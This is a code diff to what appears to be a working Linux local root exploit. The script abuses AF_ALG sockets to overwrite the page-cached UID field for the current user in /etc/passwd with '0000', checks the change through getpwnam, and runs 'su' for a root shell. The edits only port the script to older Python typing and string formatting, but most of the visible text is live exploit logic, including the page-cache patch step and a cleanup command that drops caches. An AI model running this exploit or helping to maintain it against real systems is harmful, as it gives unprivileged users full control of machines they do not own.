@@ -24,7 +24,7 @@ import pwd
 import socket
 import struct
 import sys
-from typing import Tuple
+from typing import List, Tuple
 
 AF_ALG                    = 38
 SOL_ALG                   = 279
@@ -98,7 +98,7 @@ def write4(target_path: str, file_offset: int, four_bytes: bytes) -> None:
         os.close(fd_target)
 
 
-def find_uid_field(path: str, username: str) -> tuple[int, str]:
+def find_uid_field(path: str, username: str) -> Tuple[int, str]:
     """Return (file_offset_of_uid_chars, current_uid_string) for username's
     /etc/passwd line."""
     with open(path, "rb") as f:
@@ -123,7 +123,7 @@ def find_uid_field(path: str, username: str) -> tuple[int, str]:
     raise LookupError("user {!r} not found in {}".format(username, path))
 
 
-def main(argv: list[str]) -> int:
+def main(argv: List[str]) -> int:
     user    = os.environ.get("USER") or pwd.getpwuid(os.getuid()).pw_name
     do_exec = "--shell" in argv
 
@@ -146,14 +146,14 @@ def main(argv: list[str]) -> int:
         print("[!] Pick a different user or extend with multi-shot writes.")
         return 1
 
-    print("[*] Patching {uid_str!r} -> '0000' in page cache...")
+    print("[*] Patching {!r} -> '0000' in page cache...".format(uid_str))
     write4(PASSWD, uid_off, b"0000")
 
     # Verify via fresh read (hits the page cache, not disk).
     with open(PASSWD, "rb") as f:
         f.seek(uid_off)
         landed = f.read(4)
-    print("[*] Page cache now reads {landed!r} at offset {uid_off}")
+    print("[*] Page cache now reads {!r} at offset {}".format(landed, uid_off))
     if landed != b"0000":
         print("[!] Patch did not land. Aborting.")
         return 1
@@ -161,7 +161,7 @@ def main(argv: list[str]) -> int:
     # Confirm libc agrees.
     try:
         pwent = pwd.getpwnam(user)
-        print("[*] getpwnam({user!r}).pw_uid = {pwent.pw_uid}")
+        print("[*] getpwnam({!r}).pw_uid = {}".format(user, pwent.pw_uid))
         if pwent.pw_uid != 0:
             print("[!] getpwnam still sees the real UID (NSS cache?). "
                   "Try clearing nscd/sssd cache, or run as a user that's "
@@ -170,15 +170,15 @@ def main(argv: list[str]) -> int:
         pass
 
     print()
-    print("[+] /etc/passwd page cache now lists {user} as UID 0.")
-    print("[+] Run:   su {user}")
+    print("[+] /etc/passwd page cache now lists {} as UID 0.".format(user))
+    print("[+] Run:   su {}".format(user))
     print("[+] Enter your own password. su will setuid(0) and drop a root shell.")
     print()
     print("[i] Cleanup after testing (from the root shell):")
     print("[i]   echo 3 > /proc/sys/vm/drop_caches")
 
     if do_exec:
-        print("[+] Executing `su {user}` now...")
+        print("[+] Executing `su {}` now...".format(user))
         os.execvp("su", ["su", user])
 
     # If we are not exec'ing su (dry run), evict the corrupted page so the
